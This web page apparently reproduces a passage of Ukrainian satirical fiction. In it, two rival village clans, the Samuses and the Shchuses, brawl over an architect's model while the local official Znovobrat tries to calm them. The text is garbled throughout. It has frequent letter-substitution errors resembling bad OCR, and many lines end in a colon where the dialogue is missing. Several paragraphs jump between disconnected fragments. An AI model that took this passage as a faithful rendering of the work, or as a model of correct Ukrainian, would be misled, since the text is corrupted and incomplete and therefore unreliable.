	<p>Сонце, вітри і ми… Земля дарує чудеса, жде від тебе праці й подиву і вчить високої гідності, яка пробивається в тобі могуттям думки і вмінням поглянути на світ примруженим оком. У Світлоярську враження склалося таке, що по вмів там сміятися тільки Самусь. Та коли чоловік не вміс сміятися, це ще пе означає, що йому чужі пристрасті, хвилювання, пал сердечний, який помагає йому виборювати своє, відстоювати, захищати, боротися й перемагать, щоб жити. Від того, що ми облишили Самусів і Щусів для вияснення деяких історичних моментів, пристрасті їхні не вгамувалися і суперництво, яке з несподіваною силою спалахнуло довкола макета, не припинилося.</p>
		
	<p>Боротьба розгорілася з неймовірною силою. Самусі й Щусі від словесних сунеречок перейшли до. Самусі тягли собі, Щусі — собі. Червоні обличчя, роззявлені роти, впрялеиі очі — суцільні пережитки проклятого капіталізму.</p><img src="https://3.bp.blogspot.com/-wnAMQo_luCA/V71xwpOlpwI/AAAAAAAAHD8/XCCoZ98pBvQv09JJ6h424gny3cm1iisNwCLcB/s640/asgas.png" alt="" style="max-width: 480px; max-height: 480px;"/><p>Столичний архітектор аж позадкував, як од віспп, щоб не заразишся родимими плямами. Дядько Зиовобрать мужньо кинувся поміж конфронтуючих і спробував вплинути па свідомість:. Товариші Щусі! З вас же всі люди сміються! Все прогресивне людство! Макет упав на підлогу. Па макет попадали Самусі й Щусі. Кублилися вже там. Зновобрать, влучивши момент, махнув рукою архітекторові, той вправно висмикнув з-під купи тіл свій макет, вопи мерщій занесли його до кабінету секретаря сільради, замкнули двері, тільїш тоді Щусі й Самусі схаменулися, довго відсапувалися, прокліиувалпея, після чого старий Самусь спитав старшого Щуся:.</p>
<p>Тоді настала колективна пауза, крізь яку стало чутпо гримотіння моторів, бо Допис Самусь приїхав до контори гусеничним трактором і не заглушив мотора, а Давидко так само не вимкнув мотора свого грузовика. Хотіли подіяти па своїх супротивників шумовими ефектами. Глава роду Щусі в якийсь час слухав ті падвір-ні мотори, сплюнув, сказав своєму старшому синові — лісникові Василеві Щусю:. Лч як ото нашошорилися! А ми свого пе віддамо! Товариш Зновобрать був падто досвідченим політичним діячем, щоб пе відчути, яка загроза ховається за цією, здавалося б, демократичною пропозицією Щусів і Самусів.</p>
<p>Він одразу оголосив сільський актив закритим і замкнувся в своему кабінеті з архітектором, головою колгоспу Зінккою Федорівпою і секретарем парт-оргапізації Грицьком Грицьковичем. Щусі й Самусі весь колгосп розполовинять, і ніколи ми пе дійдемо згоди. І знов загрп. І дає тобі безплатну путівку. Там, кажуть, спальня є, де цариця спала. Цілий день сонце. Вікна так влаштовано, що сонце цілий день кружляє і зазирає в них. Для рівноваги. Самусь їде, хай їде і Щусь!</p>
<p>Самусь підвівся, показуючи, тцо розмову він закінчив і від свого не відступиться. Зновобрать спробував поторгуватися. Несміливо поглянули всі на архітектора, ало той був ще надто молодий, щоб знайти вихід з такого заплутаного становища. Врешті наважився Грицько Грицькович.</p>
		
